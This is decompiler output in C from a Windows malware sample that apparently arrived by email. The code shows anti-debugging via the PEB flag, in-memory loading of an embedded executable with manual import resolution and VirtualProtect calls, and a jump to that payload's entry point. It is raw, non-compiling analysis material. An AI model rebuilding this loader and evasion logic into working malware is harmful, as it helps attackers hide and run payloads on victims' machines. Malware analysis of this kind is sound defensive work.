// subject.c
// Generated on 5/4/2015 1:14:54 AM by decompiling malware_via_email/malware_0511/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

word32 fn003E1000(word32 dwArg04)
{
	return dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
}

void fn003E101C(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	fn003E1944(dwArg08, dwArg04, dwArg0C);
	VirtualProtect(dwArg08, dwArg0C, 0x00000002, fp - 0x00000008);
	return;
}

word32 fn003E10B3(word32 ebp, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 eax_38;
	GetProcAddress(dwArg04, dwArg0C);
	word32 ebp_24;
	word32 eax_25 = fn003E1A34(dwLoc14, dwArg08, out ebp_24);
	word32 ecx_29 = Mem0[fp - 0x0000000C:word32];
	word32 esp_30 = fp - 0x00000008;
	if (eax_25 == 0x00000000)
	{
		Mem52[fp - 0x0000000C:word32] = 0x003E2040;
		Mem54[fp - 0x00000010:word32] = Mem52[ebp_24 + 0x00000010:word32];
		word32 eax_56 = fn003E19B0(ecx_29, dwArg00, dwArg04);
		word32 ecx_59 = Mem54[fp - 0x0000000C:word32];
		if (eax_56 == 0x00000000)
		{
			Mem65[fp - 0x0000000C:word32] = Mem54[ebp_24 - 0x00000004:word32];
			Mem68[0x003E8810:word32] = Mem65[fp - 0x0000000C:word32];
			eax_38 = 0x003E1050;
		}
		else
		{
			Mem71[fp - 0x0000000C:word32] = 0x003E2054;
			Mem73[fp - 0x00000010:word32] = Mem71[ebp_24 + 0x00000010:word32];
			esp_30 = fp - 0x00000008;
			if (fn003E19B0(ecx_59, dwArg00, dwArg04) == 0x00000000)
			{
				Mem83[fp - 0x0000000C:word32] = Mem73[ebp_24 - 0x00000004:word32];
				Mem86[0x003E8814:word32] = Mem83[fp - 0x0000000C:word32];
				eax_38 = 0x003E1081;
			}
			else
			{
l003E111F:
				word32 esp_47 = esp_30 - 0x00000004;
				Mem48[esp_47 + 0x00000000:word32] = Mem0[ebp_24 - 0x00000004:word32];
				eax_38 = Mem48[esp_47 + 0x00000000:word32];
			}
		}
	}
	else
		goto l003E111F;
	return eax_38;
}

byte fn003E1125(word32 dwArg04)
{
	return (byte) -(0x00000000 - (-(dwArg04 & 0x80000000) == 0x00000000));
}

word32 fn003E1138(word32 ebp)
{
	Mem14[0x003E8818:word32] = GetModuleHandleA(0x00000000);
	Mem16[0x003E881C:word32] = Mem14[fp + 0x00000004:word32];
	Mem19[fp - 0x00000010:word32] = Mem16[fp + 0x00000000:word32] + 0x00000080;
	Mem24[fp - 0x0000000C:word32] = Mem19[fp + 0x00000004:word32] + Mem19[Mem19[fp - 0x00000010:word32]:word32];
	word32 esp_13 = fp - 0x00000028;
	word32 esp_35 = esp_13 - 0x00000004;
	Mem36[esp_35 + 0x00000000:word32] = Mem24[fp - 0x0000000C:word32];
	while (Mem36[Mem36[esp_35 + 0x00000000:word32] + 0x0000000C:word32] != 0x00000000)
	{
		Mem42[fp - 0x00000014:word32] = Mem36[fp - 0x00000014:word32] & 0x00000000;
		Mem45[fp - 0x00000018:word32] = Mem42[fp - 0x00000018:word32] & 0x00000000;
		Mem48[esp_35 + 0x00000000:word32] = Mem45[fp - 0x0000000C:word32];
		word32 eax_49 = Mem48[esp_35 + 0x00000000:word32];
		Mem52[esp_35 + 0x00000000:word32] = Mem48[fp + 0x00000004:word32];
		Mem56[fp - 0x00000024:word32] = Mem52[esp_35 + 0x00000000:word32] + Mem52[eax_49 + 0x0000000C:word32];
		Mem58[esp_35 + 0x00000000:word32] = Mem56[fp - 0x00000024:word32];
		Mem61[fp - 0x00000020:word32] = LoadLibraryA(Mem58[esp_35 + 0x00000000:LPCSTR]);
		word32 esp_179 = esp_35 + 0x00000004;
		if (Mem61[Mem61[fp - 0x0000000C:word32] + 0x00000004:word32] == 0x00000000)
			Mem171[fp - 0x00000014:word32] = Mem61[fp + 0x00000004:word32] + Mem61[Mem61[fp - 0x0000000C:word32] + 0x00000010:word32];
		else
		{
			Mem173[esp_35 + 0x00000000:word32] = Mem61[fp - 0x0000000C:word32];
			word32 eax_174 = Mem173[esp_35 + 0x00000000:word32];
			Mem177[esp_35 + 0x00000000:word32] = Mem173[fp + 0x00000004:word32];
			Mem182[fp - 0x00000014:word32] = Mem177[esp_35 + 0x00000000:word32] + Mem177[eax_174 + 0x00000000:word32];
			esp_179 = esp_35 + 0x00000004;
		}
		word32 esp_66 = esp_179 - 0x00000004;
		Mem67[esp_66 + 0x00000000:word32] = Mem61[fp - 0x0000000C:word32];
		Mem73[fp - 0x0000001C:word32] = Mem67[fp + 0x00000004:word32] + Mem67[Mem67[esp_66 + 0x00000000:word32] + 0x00000010:word32];
		word32 esp_114 = esp_66 + 0x00000004;
		word32 esp_80 = esp_114 - 0x00000004;
		Mem81[esp_80 + 0x00000000:word32] = Mem73[fp - 0x00000014:word32];
		while (Mem81[Mem81[esp_80 + 0x00000000:word32]:word32] != 0x00000000)
		{
			word32 esp_107;
			Mem87[esp_80 + 0x00000000:word32] = Mem81[fp - 0x00000020:word32];
			Mem89[esp_80 - 0x00000004:word32] = Mem87[fp - 0x00000014:word32];
			Mem93[esp_80 - 0x00000004:word32] = Mem89[Mem89[esp_80 - 0x00000004:word32]:word32];
			if ((word32) fn003E1125(dwArg00) != 0x00000000)
			{
				Mem127[fp - 0x00000028:word16] = (word16) (Mem93[Mem93[fp - 0x00000014:word32]:word32] & 0x0000FFFF);
				Mem130[esp_80 + 0x00000000:word32] = (word32) Mem127[fp - 0x00000028:word16];
				Mem132[esp_80 - 0x00000004:word32] = Mem130[fp - 0x00000020:word32];
				Mem135[fp - 0x00000018:word32] = GetProcAddress(Mem132[esp_80 - 0x00000004:HMODULE], Mem132[esp_80 + 0x00000000:LPCSTR]);
				esp_107 = esp_80 + 0x00000004;
			}
			else
			{
				Mem140[fp - 0x0000002C:word32] = Mem93[fp + 0x00000004:word32] + Mem93[Mem93[fp - 0x00000014:word32]:word32];
				Mem142[esp_80 + 0x00000000:word32] = Mem140[fp - 0x0000002C:word32];
				Mem149[esp_80 + 0x00000000:word32] = Mem142[esp_80 + 0x00000000:word32] + 0x00000002;
				Mem151[esp_80 - 0x00000004:word32] = Mem149[fp - 0x00000024:word32];
				Mem153[esp_80 - 0x00000008:word32] = Mem151[fp - 0x00000020:word32];
				Mem159[fp - 0x00000018:word32] = fn003E10B3(fp - 0x00000008, dwArg00, dwArg04, dwArg08);
				esp_107 = esp_80 + 0x00000004;
			}
			Mem110[Mem93[fp - 0x0000001C:word32]:word32] = Mem93[fp - 0x00000018:word32];
			word32 esp_111 = esp_107 - 0x00000004;
			Mem112[esp_111 + 0x00000000:word32] = Mem110[fp - 0x0000001C:word32];
			Mem116[fp - 0x0000001C:word32] = Mem112[esp_111 + 0x00000000:word32] + 0x00000004;
			Mem120[fp - 0x00000014:word32] = Mem116[fp - 0x00000014:word32] + 0x00000004;
			esp_114 = esp_111 + 0x00000004;
			esp_80 = esp_114 - 0x00000004;
			Mem81[esp_80 + 0x00000000:word32] = Mem73[fp - 0x00000014:word32];
		}
		Mem161[esp_80 + 0x00000000:word32] = Mem81[fp - 0x0000000C:word32];
		Mem166[fp - 0x0000000C:word32] = Mem161[esp_80 + 0x00000000:word32] + 0x00000014;
		esp_13 = esp_80 + 0x00000004;
		esp_35 = esp_13 - 0x00000004;
		Mem36[esp_35 + 0x00000000:word32] = Mem24[fp - 0x0000000C:word32];
	}
	return Mem36[fp - 0x00000008:word32];
}

void fn003E1260(word32 ecx, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	do
	{
		if (ReadFile(dwArg04, dwArg08, dwArg0C - (ecx & 0x00000000), fp - 0x00000008, 0x00000000) == 0x00000000)
			goto l003E1295;
		Mem52[fp - 0x0000000C:word32] = ecx & 0x00000000;
	} while (0x00000000 != dwArg0C);
l003E1295:
	return;
}

void fn003E1297(word32 ecx, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	do
	{
		if (WriteFile(dwArg04, dwArg08, dwArg0C - (ecx & 0x00000000), fp - 0x00000008, 0x00000000) == 0x00000000)
			goto l003E12CC;
		Mem52[fp - 0x0000000C:word32] = ecx & 0x00000000;
	} while (0x00000000 != dwArg0C);
l003E12CC:
	return;
}

word32 fn003E12CE(word32 dwArg00, word32 dwArg04, word32 dwArg08)
{
	Mem14[fp - 0x0000000C:word32] = Mem0[fp - 0x0000000C:word32] & 0x00000000;
	while (dwLoc0C <u dwArg08)
	{
		fn003E1297(dwArg04, Mem14[dwArg00 + 0x00000004:word32], dwArg04 + 0x00000020, 0x00000008);
		fn003E1260(dwArg04, Mem14[dwArg00 + 0x00000000:word32], dwArg04 + 0x00000020, 0x00000008);
		dwLoc0C = 0x00000008;
		Mem69[fp - 0x0000000C:word32] = 0x0000000A;
	}
	return ecx;
}

void fn003E1415(word32 dwArg04)
{
	CloseHandle(Mem0[dwArg04 + 0x00000000:word32]);
	CloseHandle(Mem0[dwArg04 + 0x00000004:word32]);
	return;
}

word32 fn003E1432(word32 ebp, selector fs)
{
	word32 eax_157;
	if ((word32) Mem0[Mem0[fn003E15D0(fs) + 0x00000030:word32] + 0x00000002:byte] != 0x00000000)
		eax_157 = 0x00000000;
	else
	{
		Mem54[0x0040FF0E:word32] = 0x0000170C;
		word32 v9_55 = Mem54[0x0040FF0E:word32] + 0x000058AE;
		Mem56[0x0040FF0E:word32] = v9_55;
		Mem57[0x0040FF12:word32] = 0x000024C5;
		Mem58[0x0040FF16:word32] = 0x000017F4;
		word32 v10_59 = Mem58[0x0040FF16:word32] + 0x0000582E;
		Mem60[0x0040FF16:word32] = v10_59;
		Mem61[0x0040FF1A:word32] = 0x00004BC0;
		if (CreatePipe(fp - 0x00000024, fp - 0x00000014, 0x00000000, 0x00000010) == 0x00000000)
			eax_157 = 0x00000000;
		else
		{
			Mem81[fp - 0x00000038:word32] = 0x00000010;
			Mem83[fp - 0x0000003C:word32] = 0x00000000;
			if (CreatePipe(fp - 0x00000018, fp - 0x00000020, 0x00000000, 0x00000010) == 0x00000000)
				eax_157 = 0x00000000;
			else
			{
				Mem100[fp - 0x00000038:word32] = fp - 0x0000000C;
				Mem102[fp - 0x0000003C:word32] = 0x00000000;
				CreateThread(0x00000000, 0x00000000, 0x003E1322, fp - 0x00000024, 0x00000000, 0x00000010);
				Mem119[fp - 0x00000038:word32] = Mem102[0x003E8803:word32] >>u 0x00000002;
				Mem121[fp - 0x0000003C:word32] = 0x003E3000;
				word32 ebp_125 = fn003E12CE(0x003E1322, fp - 0x00000018, 0x00000000);
				Mem130[fp - 0x00000038:word32] = ebp_125 - 0x00000014;
				fn003E1415(dwArg00);
				Mem136[fp - 0x00000038:word32] = ebp_125 - 0x00000020;
				fn003E1415(dwArg00);
				Mem140[fp - 0x00000038:word32] = Mem136[ebp_125 - 0x00000024:word32];
				CloseHandle(Mem140[fp - 0x00000038:HANDLE]);
				Mem144[fp - 0x00000038:word32] = 0x003E3000;
				Mem148[ebp_125 - 0x0000000C:word32] = fn003E1000(dwArg00);
				if (Mem148[ebp_125 - 0x0000000C:word32] != 0x00000000)
				{
					Mem162[ebp_125 - 0x0000002C:word32] = Mem148[Mem148[ebp_125 - 0x0000000C:word32] + 0x00000034:word32];
					Mem165[fp - 0x00000038:word32] = Mem162[Mem162[ebp_125 - 0x0000000C:word32] + 0x00000054:word32];
					Mem167[fp - 0x0000003C:word32] = Mem165[ebp_125 - 0x0000002C:word32];
					Mem169[fp - 0x00000040:word32] = 0x003E3000;
					fn003E101C(dwArg00, dwArg04, dwArg08);
					Mem175[fp - 0x00000038:word32] = Mem169[ebp_125 - 0x0000002C:word32];
					Mem177[fp - 0x0000003C:word32] = 0x003E3000;
					Mem179[fp - 0x00000040:word32] = Mem177[ebp_125 - 0x0000000C:word32];
					word32 ebp_180 = fn003E15E0(dwArg00, dwArg04);
					Mem184[fp - 0x00000038:word32] = Mem179[ebp_180 - 0x0000002C:word32];
					Mem188[ebp_180 - 0x00000028:word32] = fn003E1000(dwArg00);
					if (Mem188[ebp_180 - 0x00000028:word32] != 0x00000000)
					{
						Mem192[fp - 0x00000038:word32] = Mem188[ebp_180 - 0x0000002C:word32];
						Mem194[fp - 0x0000003C:word32] = Mem192[ebp_180 - 0x00000028:word32];
						word32 ebp_195 = fn003E1138(ebp_180);
						Mem201[fp - 0x00000038:word32] = Mem194[ebp_195 - 0x0000002C:word32];
						Mem203[fp - 0x0000003C:word32] = Mem201[ebp_195 - 0x00000028:word32];
						word32 ebp_204 = fn003E1778(ebp_195);
						Mem211[Mem203[ebp_204 - 0x00000018:word32] + 0x00000008:word32] = Mem203[ebp_204 - 0x0000002C:word32];
						Mem213[fp - 0x00000038:word32] = Mem211[ebp_204 - 0x0000000C:word32];
						word32 eax_214 = Mem213[fp - 0x00000038:word32];
						Mem217[fp - 0x00000038:word32] = Mem213[ebp_204 - 0x0000002C:word32];
						word32 ecx_220 = Mem217[fp - 0x00000038:word32] + Mem217[eax_214 + 0x00000028:word32];
						Mem222[ebp_204 - 0x00000030:word32] = ecx_220;
						Mem222[ebp_204 - 0x00000030:word32]();
					}
				}
				eax_157 = 0x00000000;
			}
		}
	}
	return eax_157;
}

void fn003E15B6(selector fs)
{
	Mem14[fp - 0x0000000C:word32] = fn003E1432(fp - 0x00000008, fs);
	Mem16[fp - 0x0000000C:word32] = Mem14[fp - 0x0000000C:word32];
	ExitProcess(Mem16[fp - 0x0000000C:UINT]);
	return;
}

word32 fn003E15D0(selector fs)
{
	return Mem0[fs:0x00000018:word32];
}

word32 fn003E15E0(word32 dwArg04, word32 dwArg08)
{
	Mem13[fp - 0x00000014:word32] = Mem0[fp + 0x00000000:word32] + 0x000000F8;
	Mem19[fp - 0x00000010:word16] = Mem13[Mem13[fp + 0x00000000:word32] + 0x00000006:word16];
	Mem24[fp - 0x0000000C:word32] = Mem19[fp - 0x00000014:word32];
	Mem26[fp - 0x00000018:word16] = Mem24[fp - 0x00000018:word16] & 0x0000;
	while ((word32) wLoc18 < (word32) wLoc10)
	{
		word32 dwLoc30_125;
		word32 dwLoc30_61 = Mem26[(word32) wLoc18 *s 0x00000028 + 0x00000008 + dwLoc0C:word32];
		word32 eax_71 = Mem26[(word32) wLoc18 *s 0x00000028 + 0x00000010 + dwLoc0C:word32];
		if (dwLoc30_61 <u eax_71)
			dwLoc30_125 = dwLoc30_61;
		else
			dwLoc30_125 = eax_71;
		fn003E1944(dwArg08 + Mem26[((word32) wLoc18 *s 0x00000028 + 0x0000000C) + dwLoc0C:word32], dwArg04 + Mem26[((word32) wLoc18 *s 0x00000028 + 0x00000014) + dwLoc0C:word32], dwLoc30_125);
		wLoc18 = wLoc18 + 0x0001;
	}
	return fp - 0x00000008;
}

word32 fn003E16AE(word32 dwArg00, ptr32 ebpOut)
{
	Mem14[fp - 0x0000000C:word32] = Mem0[fp - 0x0000000C:word32] & 0x00000000;
	if ((Mem14[fp + 0x00000000:word32] & 0x04000000) != 0x00000000)
		;
	word32 dwLoc0C_100;
	if ((dwArg00 & 0x20000000) == 0x00000000)
		if ((dwArg00 & 0x40000000) == 0x00000000)
			if ((dwArg00 & 0x80000000) != 0x00000000)
				dwLoc0C_100 = dwArg00 | 0x00000008;
			else
				dwLoc0C_100 = dwArg00 | 0x00000001;
		else if ((dwArg00 & 0x80000000) != 0x00000000)
			dwLoc0C_100 = dwArg00 | 0x00000004;
		else
			dwLoc0C_100 = dwArg00 | 0x00000002;
	else if ((dwArg00 & 0x40000000) == 0x00000000)
		if ((dwArg00 & 0x80000000) != 0x00000000)
			dwLoc0C_100 = dwArg00 | 0x00000080;
		else
			dwLoc0C_100 = dwArg00 | 0x00000010;
	else if ((dwArg00 & 0x80000000) != 0x00000000)
		dwLoc0C_100 = dwArg00 | 0x00000040;
	else
		dwLoc0C_100 = dwArg00 | 0x00000020;
	word32 ebp_37;
	*ebpOut = ecx;
	return dwLoc0C_100;
}

word32 fn003E1778(word32 ebp)
{
	Mem16[fp - 0x00000014:word32] = Mem0[fp + 0x00000000:word32] + 0x000000F8;
	Mem19[fp - 0x00000010:word16] = Mem16[Mem16[fp + 0x00000000:word32] + 0x00000006:word16];
	Mem21[fp - 0x0000000C:word32] = Mem19[fp - 0x00000014:word32];
	Mem23[fp - 0x00000018:word16] = Mem21[fp - 0x00000018:word16] & 0x0000;
	word32 ebp_28 = fp - 0x00000008;
	word32 esp_14 = fp - 0x00000020;
	while ((word32) Mem23[ebp_28 - 0x00000010:word16] < (word32) Mem23[ebp_28 - 0x00000008:word16])
	{
		Mem40[ebp_28 - 0x00000018:word32] = Mem23[ebp_28 + 0x0000000C:word32] + Mem23[((word32) Mem23[ebp_28 - 0x00000010:word16] *s 0x00000028 + 0x0000000C) + Mem23[ebp_28 - 0x00000004:word32]:word32];
		Mem45[ebp_28 - 0x0000001C:word32] = Mem40[(word32) Mem40[ebp_28 - 0x00000010:word16] *s 0x00000028 + 0x00000008 + Mem40[ebp_28 - 0x00000004:word32]:word32];
		word32 esp_47 = esp_14 - 0x00000004;
		Mem48[esp_47 + 0x00000000:word32] = ebp_28 - 0x00000014;
		Mem54[esp_47 - 0x00000004:word32] = Mem48[(word32) Mem48[ebp_28 - 0x00000010:word16] *s 0x00000028 + 0x00000024 + Mem48[ebp_28 - 0x00000004:word32]:word32];
		Mem60[esp_47 - 0x00000004:word32] = fn003E16AE(ebp, out ebp_28);
		Mem62[esp_47 - 0x00000008:word32] = Mem60[ebp_28 - 0x0000001C:word32];
		Mem64[esp_47 - 0x0000000C:word32] = Mem62[ebp_28 - 0x00000018:word32];
		VirtualProtect(Mem64[esp_47 - 0x0000000C:LPVOID], Mem64[esp_47 - 8:SIZE_T], Mem64[esp_47 - 4:DWORD], Mem64[esp_47 + 0x00000000:PDWORD]);
		esp_14 = esp_47 + 0x00000004;
		Mem70[ebp_28 - 0x00000010:word16] = Mem64[ebp_28 - 0x00000010:word16] + 0x0001;
	}
	return Mem23[ebp_28 + 0x00000000:word32];
}

word32 fn003E1810(word32 dwArg04)
{
	word32 eax_12;
	if (dwArg04 >= 0x00000041 && dwArg04 <= 0x0000005A)
		eax_12 = dwArg04 + 0x00000020;
	else
		eax_12 = dwArg04;
	return eax_12;
}

void fn003E1944(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	dwArg0C = dwArg0C - 0x00000001;
	while (dwArg0C != 0x00000000)
	{
		Mem39[dwArg04 + 0x00000000:byte] = Mem0[dwArg08 + 0x00000000:byte];
		dwArg04 = dwArg04 + 0x00000001;
		dwArg08 = dwArg08 + 0x00000001;
		dwArg0C = dwArg0C - 0x00000001;
	}
	return;
}

word32 fn003E19B0(word32 ecx, word32 dwArg04, word32 dwArg08)
{
	word32 eax_27 = (word32) Mem0[dwArg04 + 0x00000000:byte] - (word32) Mem0[dwArg08 + 0x00000000:byte];
	word32 dwLoc08_30 = eax_27;
	while (eax_27 == 0x00000000 && (int32) Mem0[dwArg08 + 0x00000000:byte] != 0x00000000)
	{
		dwArg04 = dwArg04 + 0x00000001;
		dwArg08 = dwArg08 + 0x00000001;
		eax_27 = (word32) Mem0[dwArg04 + 0x00000000:byte] - (word32) Mem0[dwArg08 + 0x00000000:byte];
		dwLoc08_30 = eax_27;
	}
	if (eax_27 < 0x00000000)
		dwLoc08_30 = eax_27 | 0xFFFFFFFF;
	else if (eax_27 > 0x00000000)
		dwLoc08_30 = 0x00000001;
	return dwLoc08_30;
}

word32 fn003E1A34(word32 dwArg00, word32 dwArg04, ptr32 ebpOut)
{
	do
	{
		word32 eax_21 = fn003E1810((word32) Mem0[dwArg00 + 0x00000000:byte]);
		dwArg00 = dwArg00 + 0x00000001;
		word32 eax_34 = fn003E1810((word32) Mem0[dwArg04 + 0x00000000:byte]);
		dwArg04 = dwArg04 + 0x00000001;
	} while (eax_21 == 0x00000000 || eax_21 != eax_34);
	word32 ebp_53;
	*ebpOut = fp - 0x00000008;
	return eax_21 - eax_34;
}

